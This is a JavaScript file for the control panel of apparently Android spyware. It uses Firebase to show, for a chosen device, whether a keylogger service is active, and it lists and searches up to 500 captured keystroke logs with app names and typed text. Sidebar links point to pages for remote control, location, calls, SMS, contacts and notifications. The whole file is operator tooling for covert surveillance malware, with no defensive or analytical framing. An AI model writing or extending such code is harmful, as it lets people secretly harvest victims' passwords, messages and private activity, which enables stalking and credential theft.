// Initialize Firebase
try {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
} catch (error) {
    console.error("Firebase initialization error:", error);
}

const db = firebase.database();
const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('id');

if (!deviceId) {
    window.location.href = 'index.html';
}

// Sidebar Links
const pages = ['dashboard', 'remote', 'location', 'keylogs', 'info', 'apps', 'calls', 'sms', 'contacts', 'notifications'];
pages.forEach(page => {
    const el = document.getElementById(`link-${page}`);
    if (el) {
        el.href = page === 'dashboard' ? `device.html?id=${deviceId}` : `${page}.html?id=${deviceId}`;
    }
});

// Keylogger Status
const statusEl = document.getElementById('keylogger-status');
db.ref(`devices/${deviceId}/keyloggerActive`).on('value', snap => {
    const active = snap.val() === true;
    if (active) {
        statusEl.textContent = "Active";
        statusEl.classList.remove('status-offline');
        statusEl.classList.add('status-online');
    } else {
        statusEl.textContent = "In-Active (Service Disabled)";
        statusEl.classList.remove('status-online');
        statusEl.classList.add('status-offline');
    }
});

// Fetch Logs
const logsBody = document.getElementById('keylogs-body');
const searchInput = document.getElementById('search-input');
let allLogs = [];

db.ref(`data/${deviceId}/keylogs`).limitToLast(500).on('value', snap => {
    const data = snap.val();
    allLogs = [];

    if (data) {
        // Convert to array and reverse (newest first)
        Object.keys(data).forEach(key => {
            allLogs.push(data[key]);
        });
        allLogs.sort((a, b) => b.timestamp - a.timestamp);
    }

    renderLogs(allLogs);
});

function renderLogs(logs) {
    if (logs.length === 0) {
        logsBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 2rem; color: #6b7280;">No keylogs found yet.</td></tr>';
        return;
    }

    logsBody.innerHTML = logs.map(log => `
        <tr>
            <td style="white-space: nowrap; color: var(--text-secondary); font-size: 0.85rem;">
                ${new Date(log.timestamp).toLocaleString()}
            </td>
            <td>
                <span style="background: var(--bg-secondary); padding: 2px 6px; border-radius: 4px; font-size: 0.85rem; border: 1px solid var(--border-color);">
                    ${escapeHtml(log.appName || 'Unknown')}
                </span>
            </td>
            <td style="font-size: 0.85rem; color: var(--text-secondary);">
                ${log.type || 'Text Changed'}
            </td>
            <td style="font-family: monospace; font-size: 0.95rem;">
                ${escapeHtml(log.text)}
            </td>
        </tr>
    `).join('');
}

// Search Filter
searchInput.addEventListener('input', (e) => {
    const term = e.target.value.toLowerCase();
    const filtered = allLogs.filter(log =>
        (log.appName && log.appName.toLowerCase().includes(term)) ||
        (log.text && log.text.toLowerCase().includes(term))
    );
    renderLogs(filtered);
});

function escapeHtml(text) {
    if (!text) return "";
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
